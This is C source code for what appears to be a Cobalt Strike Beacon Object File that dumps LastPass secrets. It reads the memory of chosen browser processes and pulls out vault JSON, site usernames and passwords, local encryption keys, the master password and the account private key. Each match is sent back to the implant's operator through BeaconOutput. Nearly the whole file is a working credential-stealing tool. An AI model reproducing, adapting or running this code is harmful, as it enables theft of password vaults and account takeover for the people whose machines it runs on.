#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

typedef unsigned int uint32_t;

DWORD GetProcessList( int pid );
void GetProcessMemory( HANDLE hProcess, unsigned int pid );
void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz, unsigned int pid);
int findJSON( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid );
int findString( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid );
char* findEndString( char *buffer, int buffer_sz, char* endString );
void findPrivateKey( char* buffer, uint32_t pid );

enum LASTPASS_LABEL
{
    LASTPASS_JSON = 0,
    LASTPASS_PWD_MEM_OBJECT,
    LASTPASS_AID,
    LASTPASS_NAME,
    LASTPASS_USERNAME,
    LASTPASS_PASSWORD,
    LASTPASS_G_LOCAL_KEY,
    LASTPASS_LOCAL_KEY,
    LASTPASS_MASTER_PASSWORD,
    LASTPASS_USER_CONFIG,
    LASTPASS_PRIV_KEY,
    LASTPASS_EXIT = 100
};

typedef struct _RETURN_CHUNK
{
    char ID[10];;
    int pid;
    int label;
    int ret_size;
    char* ret[];
} RETURN_CHUNK, *PRETURN_CHUNK;

typedef struct _MEMORY_INFO 
{
    LPVOID offset;
    unsigned long long size;
    DWORD state;
    DWORD protect;
    DWORD type;
} MEMORY_INFO, *PMEMORY_INFO;

DWORD GetProcessList( int pid )
{
  HANDLE hProcess;

  // Retrieve the priority class.
  hProcess = KERNEL32$OpenProcess( PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, FALSE, pid );
  if( hProcess == NULL )
  { 
    internal_printf( "OpenProcess %d Failed\n", pid);
    return (ERROR_INVALID_STATE);
  }

  GetProcessMemory(hProcess, pid);
  KERNEL32$CloseHandle( hProcess );
    
  return( ERROR_SUCCESS );
}

void GetProcessMemory( HANDLE hProcess, unsigned int pid )
{
    LPVOID lpAddress = 0;
    MEMORY_BASIC_INFORMATION lpBuffer = {0};
    size_t VQ_sz = 0;

    if( hProcess == 0 )
    {
        internal_printf("ERROR: No Process Handle\n");
        goto END;
    }   

    do
    {
        PMEMORY_INFO mem_info = (PMEMORY_INFO)intAlloc(sizeof(MEMORY_INFO));
        MSVCRT$memset(mem_info, 0, sizeof(MEMORY_INFO));
        VQ_sz = KERNEL32$VirtualQueryEx(hProcess, lpAddress, &lpBuffer, 0x30);
        if( VQ_sz == 0x30 )
        {
            if(lpBuffer.State == MEM_COMMIT || lpBuffer.State == MEM_RESERVE) 
            {
                mem_info->offset = lpAddress;
                mem_info->size = lpBuffer.RegionSize;
                mem_info->state = lpBuffer.State;
                mem_info->type = lpBuffer.Type;
                mem_info->protect = lpBuffer.Protect;
            }else if( lpBuffer.State == MEM_FREE)
            {
                mem_info->offset = lpAddress;
                mem_info->size = lpBuffer.RegionSize;
                mem_info->state = lpBuffer.State;
                mem_info->type = lpBuffer.Type;
                mem_info->protect = lpBuffer.Protect;
            }    
        }else if (VQ_sz == 0)
        {
			intFree(mem_info);
            goto END;
        }   
        lpAddress = lpAddress + mem_info->size;
        if( mem_info->protect == PAGE_READWRITE && mem_info->type == MEM_PRIVATE)
            Write_Memory_Range( hProcess, mem_info->offset, mem_info->size, pid);
        intFree(mem_info);
    } while(1);
END:
    return;
}

void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz, unsigned int pid)
{
    BOOL rc = FALSE;
    SIZE_T bytesRead = 0;
    char *buffer = {0};
    int index = 0;
    int ret_sz = 1;

    buffer = intAlloc(address_sz+0x100 );

    rc = KERNEL32$ReadProcessMemory( hProcess, address, buffer, address_sz, &bytesRead );
    if (rc == 0)
    {
        internal_printf( "\nReadProcessMemory failed\n");
        internal_printf( "Bytes Read %d\n", bytesRead);
        internal_printf( "\n\n\n %s\n\n\n", buffer );
		goto END;
    }
    
    while( index < address_sz-16 )
    {
		// Find the JSON string that contains all username and password information about each entry
        ret_sz = findJSON( buffer+index, address_sz-index, "{\"aid\":\"", 7, "\"}}", LASTPASS_JSON, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, "\"aid\":\"", 7, "\",\"", LASTPASS_AID, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, "\"name\":\"", 8, "\",\"", LASTPASS_NAME, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, "\"username\":\"", 12, "\",\"", LASTPASS_USERNAME, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, "\"password\":\"", 12, "\",\"", LASTPASS_PASSWORD, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, "\"g_local_key\":\"", 15, "\",\"", LASTPASS_G_LOCAL_KEY, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, "\"local_key\":\"", 13, "\",\"", LASTPASS_LOCAL_KEY, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, " type=\"password\"", 16, "\">", LASTPASS_MASTER_PASSWORD, pid );
        if ( ret_sz > 0 ) goto NEXT;
        ret_sz = findString( buffer+index, address_sz-index, "<response>", 10, "</response>", LASTPASS_USER_CONFIG, pid );
        if ( ret_sz > 0 ) goto NEXT;

		// Find all cleartext passwords and users
        ret_sz = findString( buffer+index, address_sz-index, "g_aSitesA", 9, "g_numsites", LASTPASS_PWD_MEM_OBJECT, pid );
        if ( ret_sz > 0 ) goto NEXT;

        ret_sz = 1;
        findPrivateKey( buffer+index, pid);
NEXT:
        index += ret_sz;
    }
END:
    intFree(buffer);
}

int findJSON( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid )
{
    char *end = {0};
    int ret = 0;
    int header_sz = 10;
    RETURN_CHUNK* chunkptr = NULL;
    unsigned int chunkSz = 0;

    if(MSVCRT$memcmp( buffer, "{\"", 2) == 0)
    {
        end = findEndString( buffer, buffer_sz, "\":{\"aid\"");
        if (end != NULL && (end-buffer) < 25 ) 
        {
            end = findEndString( buffer, buffer_sz, endStr ); if (end != NULL) 
            {
				end += 3;
                
                buffer_sz = end-buffer;
                chunkSz = sizeof(RETURN_CHUNK) + buffer_sz + header_sz;

                chunkptr = intAlloc( chunkSz );
                MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
                chunkptr->pid = WS2_32$htonl(pid);
                chunkptr->label = WS2_32$htonl(label);
                chunkptr->ret_size = WS2_32$htonl(buffer_sz);
                MSVCRT$memcpy(chunkptr->ret, buffer+11, buffer_sz);
                BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);

                ret = end-buffer -1;
                intFree( chunkptr );
            }            
        }
    }
    return ret;
}
int findString( char* buffer, int buffer_sz, char* needle, int needle_sz, char* endStr, uint32_t label, uint32_t pid )
{
    char *end = {0};
    int ret = 0;
    int header_sz = 10;
    RETURN_CHUNK* chunkptr = NULL;
    unsigned int chunkSz = 0;

    if(MSVCRT$memcmp( buffer, needle, needle_sz) == 0)
    {
        end = findEndString( buffer, buffer_sz, endStr );
        if (end != NULL) 
        {
            buffer_sz = end-buffer;
            chunkSz = sizeof(RETURN_CHUNK) + buffer_sz + header_sz;

            chunkptr = intAlloc( chunkSz );
            MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
            chunkptr->pid = WS2_32$htonl(pid);
            chunkptr->label = WS2_32$htonl(label);
            chunkptr->ret_size = WS2_32$htonl(buffer_sz);
            MSVCRT$memcpy(chunkptr->ret, buffer+11, buffer_sz);
            BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
            ret = end-buffer -1;
            intFree( chunkptr );
        }
    } 
    return ret;
}

char* findEndString( char *buffer, int buffer_sz, char* endString )
{
    int limit = 0x100000;
    int index = 1;
    int endString_sz = MSVCRT$strlen(endString);
    if( limit > buffer_sz+endString_sz)
        limit = buffer_sz-endString_sz+1;
    while( index < limit )
    {
        if (endString_sz == 0) endString_sz = 1;    
        if ( MSVCRT$memcmp(&buffer[index], endString, endString_sz) == 0)
        {
            return &buffer[index];
        }
        index++;
    }
    return NULL;
}

void findPrivateKey( char* buffer, uint32_t pid )
{
    char *end = {0};
    char *tmp_pwd = {0};
    int header_sz = 10;
	RETURN_CHUNK* chunkptr= {0};
	int buffer_sz = 0;
    unsigned int chunkSz = 0;

    if(MSVCRT$memcmp( buffer, "PrivateKey<",11 ) == 0)
    {
        end = MSVCRT$strstr(buffer, ">LastPassPrivateKey");
        if (end <= (buffer+11))
            return;
        buffer_sz = end-(buffer+11);
        chunkSz = sizeof(RETURN_CHUNK) + buffer_sz + header_sz;

        chunkptr = intAlloc( chunkSz );
        MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
        chunkptr->pid = WS2_32$htonl(pid);
        chunkptr->label = WS2_32$htonl(LASTPASS_PRIV_KEY);
        chunkptr->ret_size = WS2_32$htonl(buffer_sz);
        MSVCRT$memcpy(chunkptr->ret, buffer+11, buffer_sz);
        BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);

        intFree( chunkptr );
    } 
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	// $args = bof_pack($1, "zi", $string_arg, $int_arg);
	datap parser = {0};
	int* pid_list = NULL;
	int pid_sz = 0;
	int size_tmp = 0;
    int header_sz = 10;
	RETURN_CHUNK* chunkptr= {0};
    unsigned int chunkSz = 0;

	BeaconDataParse(&parser, Buffer, Length);
	pid_sz = BeaconDataInt(&parser);
	
	if(!bofstart())
	{
		return;
	}

	pid_list = (int*)intAlloc(pid_sz*sizeof(int));

    DWORD datalen = 0;
    int *tmp =  (int*)BeaconDataExtract(&parser,(int*)&datalen);
	for( int index = 0; index < pid_sz; index++)
	{
		pid_list[index] = WS2_32$htonl(tmp[index]);
		dwErrorCode = GetProcessList( pid_list[index] );
		if(ERROR_SUCCESS != dwErrorCode)
		{
			BeaconPrintf(CALLBACK_ERROR, "lastpass failed: %lX\n", dwErrorCode);
		}
	}

go_end:
	if( pid_list != NULL)
		intFree(pid_list);

    chunkSz = sizeof(RETURN_CHUNK) + header_sz;
    chunkptr = intAlloc( chunkSz );
    MSVCRT$memcpy(chunkptr->ID, "LASTPASS>>",header_sz);
    chunkptr->pid = 0;
    chunkptr->label = WS2_32$htonl(LASTPASS_EXIT);
    chunkptr->ret_size = 0;
    BeaconOutput(CALLBACK_OUTPUT, (void*)chunkptr, chunkSz);
    intFree( chunkptr );

	printoutput(TRUE);
	
	bofstop();
};
#else
#define TEST_STRING_ARG "TEST_STRING_ARG"
#define TEST_INT_ARG 12345
int main(int argc, char ** argv)
{
	DWORD dwErrorCode = ERROR_SUCCESS;

	if( argc != 2)
	{
		internal_printf("USAGE: lastpass <pid>\n");
		exit(1);
	}

	internal_printf("Calling LastPass with arguments %s\n", argv[1] );

	dwErrorCode = GetProcessList( argv[1] );
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "lastpass failed: %lX\n", dwErrorCode);
	}

	internal_printf("SUCCESS.\n");

main_end:

	return dwErrorCode;
}
#endif
